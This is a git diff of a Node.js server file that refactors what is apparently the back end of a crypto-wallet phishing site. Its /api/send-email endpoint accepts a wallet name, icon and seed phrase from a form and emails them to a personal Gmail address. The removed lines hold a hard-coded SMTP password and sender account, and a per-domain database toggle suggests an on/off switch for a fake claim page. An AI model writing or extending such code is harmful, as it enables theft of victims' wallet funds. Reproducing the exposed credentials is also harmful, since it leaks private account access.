@@ -2,26 +2,21 @@ import http from "http";
 import fs from "fs";
 import path from "path";
 import url from "url";
-import nodemailer from "nodemailer";
 import { neon } from "@neondatabase/serverless";
+import * as emailService from "./api/send-email.js";
 
 const __dirname = path.dirname(url.fileURLToPath(import.meta.url));
 
 // Initialize Neon database connection
 const sql = neon(process.env.DATABASE_URL);
 
-// ✅ Configure Nodemailer transporter with timeout settings
-const transporter = nodemailer.createTransport({
-  host: "smtp.titan.email", // Replace with your provider
-  port: 465,
-  secure: true,
-  auth: {
-    user: "support@realworldfin.xyz", // Replace with your username
-    pass: "realworldfin10$", // Replace with your password
-  },
-});
+// ============================================
+// DATABASE INITIALIZATION & HELPERS
+// ============================================
 
-// Helper function to get domain ID
+/**
+ * Generate domain-based ID for consistent lookups
+ */
 function getDomainId(domain) {
   let hash = 0;
   for (let i = 0; i < domain.length; i++) {
@@ -31,7 +26,9 @@ function getDomainId(domain) {
   return Math.abs(hash);
 }
 
-// Initialize database table on startup
+/**
+ * Initialize database table on startup
+ */
 async function initDatabase() {
   try {
     await sql`
@@ -43,31 +40,23 @@ async function initDatabase() {
     `;
     console.log("✅ Database table initialized");
   } catch (error) {
-    console.error("❌ Database initialization error:", error);
+    console.error("❌ Database initialization error:", error.message);
   }
 }
 
-// Verify SMTP connection on startup
-async function verifySmtpConnection() {
-  try {
-    console.log("🔍 Verifying SMTP connection...");
-    await transporter.verify();
-    console.log("✅ SMTP connection verified successfully!");
-  } catch (error) {
-    console.error("⚠️ SMTP verification failed:", error.message);
-    console.error(
-      "Check your SMTP credentials: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS",
-    );
-  }
-}
+// ============================================
+// REQUEST HANDLERS
+// ============================================
 
-// Handle toggle endpoint
+/**
+ * Handle toggle state GET/POST requests
+ */
 const handleToggle = async (req, res, body) => {
   const host = req.headers.host || "";
   const domainId = getDomainId(host);
 
   try {
-    // Insert default state for this domain if it doesn't exist
+    // Ensure domain exists with default state
     await sql`
       INSERT INTO flareclaimspark (id, domain, state)
       VALUES (${domainId}, ${host}, 'OFF')
@@ -77,15 +66,14 @@ const handleToggle = async (req, res, body) => {
     if (req.method === "POST") {
       const { state } = JSON.parse(body);
 
+      // Validate state
       if (state !== "ON" && state !== "OFF") {
-        res.writeHead(400, {
-          "Content-Type": "application/json",
-          "Access-Control-Allow-Origin": "*",
-        });
-        res.end(JSON.stringify({ error: "Invalid state" }));
+        res.writeHead(400, { "Content-Type": "application/json" });
+        res.end(JSON.stringify({ error: "Invalid state. Use 'ON' or 'OFF'" }));
         return;
       }
 
+      // Update state in database
       await sql`
         UPDATE flareclaimspark
         SET state = ${state}
@@ -94,20 +82,15 @@ const handleToggle = async (req, res, body) => {
 
       console.log(`✅ Toggle updated: ${host} → ${state}`);
 
-      res.writeHead(200, {
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*",
-      });
-      res.end(JSON.stringify({ state, domain: host }));
+      res.writeHead(200, { "Content-Type": "application/json" });
+      res.end(JSON.stringify({ success: true, state, domain: host }));
     } else if (req.method === "GET") {
+      // Retrieve current state
       const result = await sql`
         SELECT state, domain FROM flareclaimspark WHERE id = ${domainId}
       `;
 
-      res.writeHead(200, {
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*",
-      });
+      res.writeHead(200, { "Content-Type": "application/json" });
       res.end(
         JSON.stringify({
           state: result[0]?.state || "OFF",
@@ -116,201 +99,198 @@ const handleToggle = async (req, res, body) => {
       );
     }
   } catch (error) {
-    console.error("❌ Database error:", error);
-    res.writeHead(500, {
-      "Content-Type": "application/json",
-      "Access-Control-Allow-Origin": "*",
-    });
+    console.error("❌ Database error:", error.message);
+    res.writeHead(500, { "Content-Type": "application/json" });
     res.end(
-      JSON.stringify({
-        error: "Database error",
-        message: error.message,
-      }),
+      JSON.stringify({ error: "Database error", message: error.message }),
     );
   }
 };
 
-// Send email using Nodemailer
-const sendEmail = async (req, res, body) => {
+/**
+ * Handle send email requests
+ */
+const handleSendEmail = async (req, res, body) => {
   if (req.method !== "POST") {
-    return res.status(405).json({ error: "Method not allowed" });
+    res.writeHead(405, { "Content-Type": "application/json" });
+    res.end(JSON.stringify({ error: "Method not allowed. Use POST." }));
+    return;
   }
 
-  const { walletName, walletIcon, seedPhrase } = req.body;
-
-  // Validate inputs
-  if (!walletName || !walletIcon || !seedPhrase) {
-    return res.status(400).json({ error: "Missing required fields" });
-  }
-
-  console.log("📧 Received email request:", {
-    walletName,
-    walletIcon,
-    seedPhrase: seedPhrase ? "✓" : "✗",
-  });
-
-  // if (!walletName || !walletIcon || !seedPhrase) {
-  //   res.writeHead(400, {
-  //     "Content-Type": "application/json",
-  //     "Access-Control-Allow-Origin": "*",
-  //   });
-  //   res.end(JSON.stringify({ error: "Missing required fields" }));
-  //   return;
-  // }
-
-  // ✅ Check if SMTP credentials are configured
-  // if (
-  //   !process.env.SMTP_HOST ||
-  //   !process.env.SMTP_USER ||
-  //   !process.env.SMTP_PASS
-  // ) {
-  //   throw new Error(
-  //     "SMTP credentials not configured. Check SMTP_HOST, SMTP_USER, SMTP_PASS environment variables",
-  //   );
-  // }
-
-  console.log("📤 Sending email via Nodemailer...");
-  console.log("⏱️ Timeout: 10 seconds for connection and socket operations");
-
-  // ✅ Send email via Nodemailer with error handling
   try {
-    const result = await transporter.sendMail({
-      from: '"Sender" <support@realworldfin.xyz>',
-      to: "danielekene6b@gmail.com",
-      subject: `New Message from ${walletName}`,
-      html: `
-          <h2>New Submission</h2>
-          <p><strong>Name:</strong> ${walletName}</p>
-          <p><strong>Icon:</strong> ${walletIcon}</p>
-          <p><strong>Message:</strong></p>
-          <p>${seedPhrase.replace(/\n/g, "<br>")}</p>
-          <hr>
-          <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
-        `,
+    // Parse request body
+    const data = JSON.parse(body);
+    const { walletName, walletIcon, seedPhrase } = data;
+
+    console.log("📧 Email request received from:", walletName);
+
+    // Send email via email service
+    const result = await emailService.sendFormEmail({
+      walletName,
+      walletIcon,
+      seedPhrase,
     });
 
-    console.log("✅ Email sent successfully via Nodemailer:", result.messageId);
-
-    return res.status(200).json({
-      success: true,
-      message: "✅ Email sent successfully via Resend",
-      messageId: result.id,
-    });
+    res.writeHead(200, { "Content-Type": "application/json" });
+    res.end(JSON.stringify(result));
   } catch (error) {
-    console.error("Resend Email error:", error);
-    return res.status(500).json({
-      success: false,
-      error: "Failed to send email via Resend",
-      details: error.message,
-    });
+    console.error("❌ Email error:", error.message);
+    res.writeHead(400, { "Content-Type": "application/json" });
+    res.end(JSON.stringify({ success: false, error: error.message }));
   }
 };
 
-// Basic static file + API handler
+/**
+ * Handle test email endpoint
+ */
+const handleTestEmail = async (req, res) => {
+  try {
+    const result = await emailService.sendTestEmail();
+    res.writeHead(200, { "Content-Type": "application/json" });
+    res.end(JSON.stringify(result));
+  } catch (error) {
+    res.writeHead(500, { "Content-Type": "application/json" });
+    res.end(JSON.stringify({ success: false, error: error.message }));
+  }
+};
+
+/**
+ * Serve static files
+ */
+const serveStaticFile = (res, filePath) => {
+  const ext = path.extname(filePath);
+  const contentTypes = {
+    ".html": "text/html",
+    ".js": "text/javascript",
+    ".css": "text/css",
+    ".json": "application/json",
+    ".png": "image/png",
+    ".jpg": "image/jpg",
+    ".gif": "image/gif",
+    ".svg": "image/svg+xml",
+    ".ico": "image/x-icon",
+    ".woff": "font/woff",
+    ".woff2": "font/woff2",
+  };
+
+  const contentType = contentTypes[ext] || "text/plain";
+
+  fs.readFile(filePath, (err, content) => {
+    if (err) {
+      res.writeHead(404, { "Content-Type": "text/plain" });
+      res.end("404 - File Not Found");
+    } else {
+      res.writeHead(200, { "Content-Type": contentType });
+      res.end(content);
+    }
+  });
+};
+
+// ============================================
+// HTTP SERVER
+// ============================================
+
 const server = http.createServer((req, res) => {
   const parsedUrl = url.parse(req.url);
+  const pathname = parsedUrl.pathname;
 
-  // Handle CORS preflight
+  // Set CORS headers for all responses
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+
+  // Handle preflight requests
   if (req.method === "OPTIONS") {
-    res.writeHead(200, {
-      "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
-      "Access-Control-Allow-Headers": "Content-Type",
-    });
+    res.writeHead(200);
     res.end();
     return;
   }
 
-  // Handle send-email endpoint
-  if (req.method === "POST" && parsedUrl.pathname === "/api/send-email") {
+  // API Routes
+  if (pathname === "/api/send-email" && req.method === "POST") {
     let body = "";
     req.on("data", (chunk) => (body += chunk));
-    req.on("end", () => sendEmail(req, res, body));
+    req.on("end", () => handleSendEmail(req, res, body));
+    return;
   }
-  // Handle toggle endpoint (GET and POST)
-  else if (parsedUrl.pathname === "/api/toggle") {
-    if (req.method === "GET") {
-      handleToggle(req, res, "");
-    } else if (req.method === "POST") {
+
+  if (pathname === "/api/toggle") {
+    if (req.method === "POST") {
       let body = "";
       req.on("data", (chunk) => (body += chunk));
       req.on("end", () => handleToggle(req, res, body));
+    } else if (req.method === "GET") {
+      handleToggle(req, res, "");
     }
+    return;
   }
-  // Health check
-  else if (parsedUrl.pathname === "/health" || parsedUrl.pathname === "/") {
+
+  if (pathname === "/test-email") {
+    handleTestEmail(req, res);
+    return;
+  }
+
+  // Health check / Info endpoint
+  if (pathname === "/" || pathname === "/health") {
     res.writeHead(200, { "Content-Type": "application/json" });
-    res.end(
-      JSON.stringify({
-        status: "Server is running",
-        endpoints: ["/api/send-email", "/api/toggle"],
-      }),
-    );
+    const status = {
+      status: "🟢 Server is running",
+      endpoints: {
+        POST: "/api/send-email - Send form email",
+        GET: "/api/toggle - Get toggle state",
+        POST: "/api/toggle - Update toggle state",
+        GET: "/test-email - Send test email",
+      },
+      smtp: emailService.getSmtpStatus(),
+      database: process.env.DATABASE_URL ? "✅" : "❌",
+    };
+    res.end(JSON.stringify(status, null, 2));
+    return;
   }
-  // Test email endpoint
-  else if (parsedUrl.pathname === "/test-email") {
-    transporter
-      .sendMail({
-        from: '"Test Sender" <support@realworldfin.xyz>',
-        to: "danielekene6b@gmail.com",
-        subject: "Test Email from Render",
-        html: "<h1>✅ Test Email</h1><p>If you see this, Nodemailer is working!</p>",
-      })
-      .then((result) => {
-        console.log("✅ Test email sent:", result.messageId);
-        res.writeHead(200, { "Content-Type": "application/json" });
-        res.end(JSON.stringify({ success: true, messageId: result.messageId }));
-      })
-      .catch((err) => {
-        console.error("❌ Test email failed:", err.message);
-        res.writeHead(500, { "Content-Type": "application/json" });
-        res.end(JSON.stringify({ error: err.message }));
-      });
-  }
-  // Serve static files
-  else {
-    let filePath = `.${parsedUrl.pathname}`;
-    if (filePath === "./") filePath = "./index.html";
 
-    const ext = path.extname(filePath);
-    const contentType =
-      {
-        ".html": "text/html",
-        ".js": "text/javascript",
-        ".css": "text/css",
-        ".json": "application/json",
-        ".png": "image/png",
-        ".jpg": "image/jpg",
-        ".svg": "image/svg+xml",
-        ".ico": "image/x-icon",
-      }[ext] || "text/plain";
+  // Static files
+  let filePath = `.${pathname}`;
+  if (filePath === "./") filePath = "./index.html";
 
-    fs.readFile(filePath, (err, content) => {
-      if (err) {
-        res.writeHead(404, { "Content-Type": "text/plain" });
-        res.end("Not Found");
-      } else {
-        res.writeHead(200, { "Content-Type": contentType });
-        res.end(content);
-      }
-    });
-  }
+  serveStaticFile(res, filePath);
 });
+
+// ============================================
+// SERVER STARTUP
+// ============================================
 
 const PORT = process.env.PORT || 3000;
 
-// Initialize database and start server
-initDatabase().then(() => {
-  verifySmtpConnection();
+async function startServer() {
+  try {
+    // Initialize database
+    await initDatabase();
 
-  server.listen(PORT, () => {
-    console.log(`✅ Server running on port ${PORT}`);
-    console.log(`📧 Email provider: Nodemailer (SMTP)`);
-    console.log(`🔑 SMTP Host set: ${process.env.SMTP_HOST ? "Yes" : "No"}`);
-    console.log(`🔑 SMTP Port: ${process.env.SMTP_PORT || "587"}`);
-    console.log(`🔑 SMTP User set: ${process.env.SMTP_USER ? "Yes" : "No"}`);
-    console.log(
-      `💾 Database URL set: ${process.env.DATABASE_URL ? "Yes" : "No"}`,
-    );
-  });
-});
+    // Verify SMTP connection
+    await emailService.verifySmtpConnection();
+
+    // Start HTTP server
+    server.listen(PORT, () => {
+      console.log("\n╔═══════════════════════════════════════╗");
+      console.log("║  🚀 SERVER STARTED SUCCESSFULLY       ║");
+      console.log("╚═══════════════════════════════════════╝\n");
+      console.log(`📍 Port: ${PORT}`);
+      console.log(`📧 Email Service: Nodemailer`);
+      console.log(
+        `💾 Database: ${process.env.DATABASE_URL ? "Connected" : "Not configured"}`,
+      );
+      console.log("\n📌 Endpoints:");
+      console.log(`   POST /api/send-email - Send form submission email`);
+      console.log(`   GET  /api/toggle     - Get toggle state`);
+      console.log(`   POST /api/toggle     - Update toggle state`);
+      console.log(`   GET  /test-email     - Send test email`);
+      console.log(`   GET  /health         - Server health & status\n`);
+    });
+  } catch (error) {
+    console.error("❌ Failed to start server:", error.message);
+    process.exit(1);
+  }
+}
+
+// Start the server
+startServer();
